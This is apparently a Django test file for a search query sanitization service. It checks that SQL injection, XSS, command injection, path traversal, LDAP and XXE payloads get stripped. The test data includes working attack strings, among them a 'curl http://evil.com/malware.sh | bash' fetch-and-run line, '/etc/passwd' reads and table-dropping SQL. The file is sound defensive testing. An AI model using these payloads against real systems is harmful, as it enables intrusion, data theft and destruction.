"""
Search Query Sanitization Tests

Comprehensive tests for query sanitization and security.

Test Coverage:
- SQL injection prevention
- XSS attack prevention
- Command injection prevention
- Special character handling
- Query length limits
- Unicode handling

Compliance with .claude/rules.md:
- Rule #9: Input validation
- Rule #11: Specific exception handling
"""

import pytest
from django.test import TestCase, TransactionTestCase
from django.contrib.auth import get_user_model
from django.core.exceptions import ValidationError

from apps.core.services.query_sanitization_service import QuerySanitizationService

User = get_user_model()


class QuerySanitizationTestCase(TestCase):
    """Test query sanitization functionality."""

    def setUp(self):
        """Set up test fixtures."""
        self.sanitizer = QuerySanitizationService()

    def test_sql_injection_basic(self):
        """Test prevention of basic SQL injection attempts."""
        malicious_queries = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "' UNION SELECT * FROM users--",
        ]

        for query in malicious_queries:
            with self.subTest(query=query):
                sanitized = self.sanitizer.sanitize_sql_input(query, context='value')

                # Should not contain SQL keywords or comment markers
                sanitized_lower = sanitized.lower()
                self.assertNotIn('drop table', sanitized_lower)
                self.assertNotIn('union select', sanitized_lower)
                self.assertNotIn('--', sanitized)
                self.assertNotIn(';', sanitized)

    def test_sql_injection_advanced(self):
        """Test prevention of advanced SQL injection attempts."""
        malicious_queries = [
            "admin' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--",
            "' OR '1'='1' /*",
            "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",
            "' OR SLEEP(5)--",
            "1' AND '1'='1' UNION ALL SELECT 1,2,3,4,5--",
        ]

        for query in malicious_queries:
            with self.subTest(query=query):
                sanitized = self.sanitizer.sanitize_sql_input(query, context='value')

                # Should not contain dangerous keywords
                dangerous_keywords = [
                    'union', 'exec', 'execute', 'sleep', 'benchmark',
                    'information_schema', 'sp_', 'xp_', 'drop', 'alter',
                    'create', 'insert', 'update', 'delete'
                ]

                sanitized_lower = sanitized.lower()
                for keyword in dangerous_keywords:
                    self.assertNotIn(keyword, sanitized_lower,
                                    f"Found dangerous keyword '{keyword}' in sanitized output")

    def test_xss_prevention_basic(self):
        """Test prevention of basic XSS attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
        ]

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain script tags or javascript: protocol
                sanitized_lower = sanitized.lower()
                self.assertNotIn('<script', sanitized_lower)
                self.assertNotIn('javascript:', sanitized_lower)
                self.assertNotIn('onerror=', sanitized_lower)
                self.assertNotIn('onload=', sanitized_lower)

    def test_xss_prevention_advanced(self):
        """Test prevention of advanced XSS attacks."""
        xss_payloads = [
            "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
            "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
            "<STYLE>@import'http://evil.com/xss.css';</STYLE>",
            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
        ]

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain dangerous tags or attributes
                dangerous_elements = ['<script', '<embed', '<meta', '<style', '<object', '<iframe']
                sanitized_lower = sanitized.lower()

                for element in dangerous_elements:
                    self.assertNotIn(element, sanitized_lower)

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(id)",
            "; curl http://evil.com/malware.sh | bash",
        ]

        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain shell operators
                self.assertNotIn(';', sanitized)
                self.assertNotIn('|', sanitized)
                self.assertNotIn('`', sanitized)
                self.assertNotIn('$', sanitized)
                self.assertNotIn('&', sanitized)

    def test_special_character_handling(self):
        """Test proper handling of special characters."""
        test_cases = [
            ("hello'world", "hello world"),  # Single quote removed
            ('hello"world', 'hello world'),  # Double quote removed
            ("hello<>world", "hello world"),  # Angle brackets removed
            ("hello;world", "hello world"),  # Semicolon removed
            ("hello--world", "hello world"),  # Double dash removed
        ]

        for input_str, expected_contains in test_cases:
            with self.subTest(input=input_str):
                sanitized = self.sanitizer.sanitize_sql_input(input_str, context='value')

                # Should contain the safe parts
                self.assertIn('hello', sanitized)
                self.assertIn('world', sanitized)

    def test_unicode_handling(self):
        """Test proper handling of Unicode characters."""
        unicode_queries = [
            "search 日本語 query",  # Japanese
            "найти текст",  # Russian (Cyrillic)
            "بحث نص",  # Arabic
            "खोज पाठ",  # Hindi (Devanagari)
            "搜索文本",  # Chinese
        ]

        for query in unicode_queries:
            with self.subTest(query=query):
                sanitized = self.sanitizer.sanitize_sql_input(query, context='value')

                # Should preserve Unicode characters
                self.assertIsNotNone(sanitized)
                self.assertIsInstance(sanitized, str)

    def test_query_length_limits(self):
        """Test enforcement of query length limits."""
        # Very long query
        long_query = "a" * 10000

        sanitized = self.sanitizer.sanitize_sql_input(long_query, context='value')

        # Should be truncated to reasonable length
        # Assuming max length is around 1000 characters
        self.assertLessEqual(len(sanitized), 1000)

    def test_null_and_empty_handling(self):
        """Test handling of null and empty inputs."""
        test_cases = [
            None,
            "",
            "   ",
            "\t\n",
        ]

        for input_value in test_cases:
            with self.subTest(input=input_value):
                sanitized = self.sanitizer.sanitize_sql_input(input_value, context='value')

                # Should return empty string or safe default
                self.assertIsNotNone(sanitized)
                self.assertIsInstance(sanitized, str)

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for payload in path_traversal_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain path traversal sequences
                self.assertNotIn('..', sanitized)
                self.assertNotIn('%2e', sanitized.lower())
                self.assertNotIn('/etc/', sanitized.lower())
                self.assertNotIn('\\windows\\', sanitized.lower())

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection attacks."""
        ldap_payloads = [
            "admin*",
            "admin)(uid=*",
            "admin)(&(uid=*",
            "*)(objectClass=*",
        ]

        for payload in ldap_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain LDAP special characters in dangerous context
                # This is context-dependent, but basic sanitization should help

    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!--<script>alert('XSS')</script>-->",
        ]

        for payload in xml_payloads:
            with self.subTest(payload=payload):
                sanitized = self.sanitizer.sanitize_sql_input(payload, context='value')

                # Should not contain XML special tags
                sanitized_lower = sanitized.lower()
                self.assertNotIn('<!doctype', sanitized_lower)
                self.assertNotIn('<!entity', sanitized_lower)
                self.assertNotIn('<![cdata', sanitized_lower)

    def test_normal_search_queries_preserved(self):
        """Test that normal, benign search queries are preserved."""
        normal_queries = [
            "laptop",
            "john smith",
            "project 2025",
            "meeting room A",
            "support ticket 12345",
            "employee@company.com",
        ]

        for query in normal_queries:
            with self.subTest(query=query):
                sanitized = self.sanitizer.sanitize_sql_input(query, context='value')

                # Should preserve the main content
                words = query.split()
                for word in words:
                    # Remove special chars from word for comparison
                    clean_word = ''.join(c for c in word if c.isalnum())
                    if clean_word:
                        self.assertIn(clean_word.lower(), sanitized.lower())


@pytest.mark.integration
class SanitizationIntegrationTest(TransactionTestCase):
    """Integration tests for search sanitization."""

    def setUp(self):
        """Set up test fixtures."""
        self.sanitizer = QuerySanitizationService()

    def test_sanitization_with_search_service(self):
        """Test sanitization integration with search service."""
        # This would test the actual search service with sanitized queries
        # Placeholder for when search service is fully implemented
        pass

    def test_sanitization_performance(self):
        """Test that sanitization doesn't significantly impact performance."""
        import timeit

        test_query = "normal search query with some words"

        # Measure time for 1000 sanitizations
        start_time = timeit.default_timer()
        for i in range(1000):
            self.sanitizer.sanitize_sql_input(test_query, context='value')
        elapsed = timeit.default_timer() - start_time

        # Should be able to sanitize 1000 queries in < 1 second
        self.assertLess(elapsed, 1.0)

    def test_sanitization_with_unicode_edge_cases(self):
        """Test sanitization with Unicode edge cases."""
        edge_cases = [
            "emoji test 🔥💻🚀",
            "combining characters café",
            "zero-width joiner test‍",
            "right-to-left override test‮",
        ]

        for query in edge_cases:
            with self.subTest(query=query):
                # Should not raise exception
                sanitized = self.sanitizer.sanitize_sql_input(query, context='value')
                self.assertIsNotNone(sanitized)
